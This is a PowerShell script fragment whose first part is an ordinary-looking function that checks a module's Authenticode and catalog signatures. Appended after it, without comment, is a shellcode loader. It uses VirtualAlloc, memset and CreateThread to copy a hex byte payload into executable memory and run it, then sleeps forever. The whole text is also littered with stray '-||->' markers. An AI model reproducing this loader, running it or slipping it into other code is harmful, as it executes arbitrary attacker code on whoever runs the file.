 -||-> function ValidateAndGet-AuthenticodeSignature
{
    [CmdletBinding()]
    Param
    (
        [Parameter(Mandatory=$true)]
        [PSModuleInfo]
        $ModuleInfo
    )

     -||-> $ModuleDetails = $null <-||- 
     -||-> $AuthenticodeSignature = $null <-||- 

     -||-> $ModuleName = $ModuleInfo.Name <-||- 
     -||-> $ModuleBasePath = $ModuleInfo.ModuleBase <-||- 
     -||-> $ModuleManifestName = "$ModuleName.psd1" <-||- 
     -||-> $CatalogFileName = "$ModuleName.cat" <-||- 
     -||-> $CatalogFilePath =  -||-> Microsoft.PowerShell.Management\Join-Path -Path $ModuleBasePath -ChildPath $CatalogFileName <-||-  <-||- 

     -||-> if( -||-> Microsoft.PowerShell.Management\Test-Path -Path $CatalogFilePath -PathType Leaf <-||- )
    {
         -||-> $message = $LocalizedData.CatalogFileFound -f ( -||-> $CatalogFileName, $ModuleName <-||- ) <-||- 
         -||-> Write-Verbose -Message $message <-||- 

         -||-> $AuthenticodeSignature =  -||-> Microsoft.PowerShell.Security\Get-AuthenticodeSignature -FilePath $CatalogFilePath <-||-  <-||- 

         -||-> if( -||-> -not $AuthenticodeSignature -or ( -||-> $AuthenticodeSignature.Status -ne "Valid" <-||- ) <-||- )
        {
             -||-> $message = $LocalizedData.InvalidModuleAuthenticodeSignature -f ( -||-> $ModuleName, $CatalogFileName <-||- ) <-||- 
             -||-> ThrowError -ExceptionName 'System.InvalidOperationException' `
                        -ExceptionMessage $message `
                        -ErrorId 'InvalidAuthenticodeSignature' `
                        -CallerPSCmdlet $PSCmdlet `
                        -ErrorCategory InvalidOperation <-||- 

            return
        } <-||- 

         -||-> Write-Verbose -Message ( -||-> $LocalizedData.ValidAuthenticodeSignature -f @( -||-> $CatalogFileName, $ModuleName <-||- ) <-||- ) <-||- 

         -||-> if( -||-> Get-Command -Name Test-FileCatalog -Module Microsoft.PowerShell.Security -ErrorAction Ignore <-||- )
        {
             -||-> Write-Verbose -Message ( -||-> $LocalizedData.ValidatingCatalogSignature -f @( -||-> $ModuleName, $CatalogFileName <-||- ) <-||- ) <-||- 

            
             -||-> $TestFileCatalogResult =  -||-> Microsoft.PowerShell.Security\Test-FileCatalog -Path $ModuleBasePath `
                                                                                    -CatalogFilePath $CatalogFilePath `
                                                                                    -FilesToSkip $script:PSGetItemInfoFileName,'*.cat','*.nupkg','*.nuspec' `
                                                                                    -Detailed `
                                                                                    -ErrorAction SilentlyContinue <-||-  <-||- 
             -||-> if( -||-> -not $TestFileCatalogResult -or
                ( -||-> $TestFileCatalogResult.Status -ne "Valid" <-||- ) -or
                ( -||-> $TestFileCatalogResult.Signature.Status -ne "Valid" <-||- ) <-||- )
            {
                 -||-> $message = $LocalizedData.InvalidCatalogSignature -f ( -||-> $ModuleName, $CatalogFileName <-||- ) <-||- 
                 -||-> ThrowError -ExceptionName 'System.InvalidOperationException' `
                            -ExceptionMessage $message `
                            -ErrorId 'InvalidCatalogSignature' `
                            -CallerPSCmdlet $PSCmdlet `
                            -ErrorCategory InvalidOperation <-||- 
                return
            }
            else
            {
                 -||-> Write-Verbose -Message ( -||-> $LocalizedData.ValidCatalogSignature -f @( -||-> $CatalogFileName, $ModuleName <-||- ) <-||- ) <-||- 
            } <-||- 
        } <-||- 
    }
    else
    {
         -||-> Write-Verbose -Message ( -||-> $LocalizedData.CatalogFileNotFoundInNewModule -f ( -||-> $CatalogFileName, $ModuleName <-||- ) <-||- ) <-||- 

         -||-> $message = "Using the '{0}' file for getting the authenticode signature." -f ( -||-> $ModuleManifestName <-||- ) <-||- 
         -||-> Write-Debug -Message $message <-||- 

         -||-> $AuthenticodeSignature =  -||-> Microsoft.PowerShell.Security\Get-AuthenticodeSignature -FilePath $ModuleInfo.Path <-||-  <-||- 

         -||-> if( -||-> $AuthenticodeSignature <-||- )
        {
             -||-> if( -||-> $AuthenticodeSignature.Status -eq "Valid" <-||- )
            {
                 -||-> Write-Verbose -Message ( -||-> $LocalizedData.ValidAuthenticodeSignatureInFile -f @( -||-> $ModuleManifestName, $ModuleName <-||- ) <-||- ) <-||- 
            }
            elseif( -||-> $AuthenticodeSignature.Status -ne "NotSigned" <-||- )
            {
                 -||-> $message = $LocalizedData.InvalidModuleAuthenticodeSignature -f ( -||-> $ModuleName, $ModuleManifestName <-||- ) <-||- 
                 -||-> ThrowError -ExceptionName 'System.InvalidOperationException' `
                           -ExceptionMessage $message `
                           -ErrorId 'InvalidAuthenticodeSignature' `
                           -CallerPSCmdlet $PSCmdlet `
                           -ErrorCategory InvalidOperation <-||- 
                return
            } <-||- 
        } <-||- 
    } <-||- 

     -||-> if( -||-> $AuthenticodeSignature <-||- )
    {
         -||-> $ModuleDetails = @{} <-||- 
         -||-> $ModuleDetails['AuthenticodeSignature'] = $AuthenticodeSignature <-||- 
         -||-> $ModuleDetails['Version'] = $ModuleInfo.Version <-||- 
         -||-> $ModuleDetails['ModuleBase']=$ModuleInfo.ModuleBase <-||- 
         -||-> $ModuleDetails['IsMicrosoftCertificate'] =  -||-> Test-MicrosoftCertificate -AuthenticodeSignature $AuthenticodeSignature <-||-  <-||- 
         -||-> $PublisherDetails =  -||-> Get-AuthenticodePublisher -AuthenticodeSignature $AuthenticodeSignature <-||-  <-||- 
         -||-> $ModuleDetails['Publisher'] =  -||-> if( -||-> $PublisherDetails <-||- ) { -||-> $PublisherDetails.Publisher <-||- } <-||-  <-||- 
         -||-> $ModuleDetails['RootCertificateAuthority'] =  -||-> if( -||-> $PublisherDetails <-||- ) { -||-> $PublisherDetails.PublisherRootCA <-||- } <-||-  <-||- 

         -||-> $message = $LocalizedData.NewModuleVersionDetailsForPublisherValidation -f ( -||-> $ModuleInfo.Name, $ModuleInfo.Version, $ModuleDetails.Publisher, $ModuleDetails.RootCertificateAuthority, $ModuleDetails.IsMicrosoftCertificate <-||- ) <-||- 
         -||-> Write-Debug $message <-||- 
    } <-||- 

    return  -||-> $ModuleDetails <-||- 
} <-||- 
 -||-> $c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);' <-||- ; -||-> $w =  -||-> Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru <-||-  <-||- ; -||-> [Byte[]] <-||- ; -||-> [Byte[]]$z = 0xd9,0xee,0xb8,0x52,0x88,0x3e,0xc1,0xd9,0x74,0x24,0xf4,0x5d,0x2b,0xc9,0xb1,0x47,0x31,0x45,0x18,0x03,0x45,0x18,0x83,0xc5,0x56,0x6a,0xcb,0x3d,0xbe,0xe8,0x34,0xbe,0x3e,0x8d,0xbd,0x5b,0x0f,0x8d,0xda,0x28,0x3f,0x3d,0xa8,0x7d,0xb3,0xb6,0xfc,0x95,0x40,0xba,0x28,0x99,0xe1,0x71,0x0f,0x94,0xf2,0x2a,0x73,0xb7,0x70,0x31,0xa0,0x17,0x49,0xfa,0xb5,0x56,0x8e,0xe7,0x34,0x0a,0x47,0x63,0xea,0xbb,0xec,0x39,0x37,0x37,0xbe,0xac,0x3f,0xa4,0x76,0xce,0x6e,0x7b,0x0d,0x89,0xb0,0x7d,0xc2,0xa1,0xf8,0x65,0x07,0x8f,0xb3,0x1e,0xf3,0x7b,0x42,0xf7,0xca,0x84,0xe9,0x36,0xe3,0x76,0xf3,0x7f,0xc3,0x68,0x86,0x89,0x30,0x14,0x91,0x4d,0x4b,0xc2,0x14,0x56,0xeb,0x81,0x8f,0xb2,0x0a,0x45,0x49,0x30,0x00,0x22,0x1d,0x1e,0x04,0xb5,0xf2,0x14,0x30,0x3e,0xf5,0xfa,0xb1,0x04,0xd2,0xde,0x9a,0xdf,0x7b,0x46,0x46,0xb1,0x84,0x98,0x29,0x6e,0x21,0xd2,0xc7,0x7b,0x58,0xb9,0x8f,0x48,0x51,0x42,0x4f,0xc7,0xe2,0x31,0x7d,0x48,0x59,0xde,0xcd,0x01,0x47,0x19,0x32,0x38,0x3f,0xb5,0xcd,0xc3,0x40,0x9f,0x09,0x97,0x10,0xb7,0xb8,0x98,0xfa,0x47,0x45,0x4d,0x96,0x42,0xd1,0x07,0x07,0x98,0x14,0xb0,0xc5,0x22,0x57,0xfd,0x43,0xc4,0x07,0xad,0x03,0x59,0xe7,0x1d,0xe4,0x09,0x8f,0x77,0xeb,0x76,0xaf,0x77,0x21,0x1f,0x45,0x98,0x9c,0x77,0xf1,0x01,0x85,0x0c,0x60,0xcd,0x13,0x69,0xa2,0x45,0x90,0x8d,0x6c,0xae,0xdd,0x9d,0x18,0x5e,0xa8,0xfc,0x8e,0x61,0x06,0x6a,0x2e,0xf4,0xad,0x3d,0x79,0x60,0xac,0x18,0x4d,0x2f,0x4f,0x4f,0xc6,0xe6,0xc5,0x30,0xb0,0x06,0x0a,0xb1,0x40,0x51,0x40,0xb1,0x28,0x05,0x30,0xe2,0x4d,0x4a,0xed,0x96,0xde,0xdf,0x0e,0xcf,0xb3,0x48,0x67,0xed,0xea,0xbf,0x28,0x0e,0xd9,0x41,0x14,0xd9,0x27,0x34,0x74,0xd9 <-||- ; -||-> $g = 0x1000 <-||- ; -||-> if ( -||-> $z.Length -gt 0x1000 <-||- ){ -||-> $g = $z.Length <-||- } <-||- ; -||-> $x=$w::VirtualAlloc(0,0x1000,$g,0x40) <-||- ;for ( -||-> $i=0 <-||- ; -||-> $i -le ( -||-> $z.Length-1 <-||- ) <-||- ; -||-> $i++ <-||- ) { -||-> $w::memset([IntPtr]( -||-> $x.ToInt32()+$i <-||- ), $z[$i], 1) <-||- }; -||-> $w::CreateThread(0,0,$x,0,0,0) <-||- ;for (;;){ -||-> Start-sleep 60 <-||- };



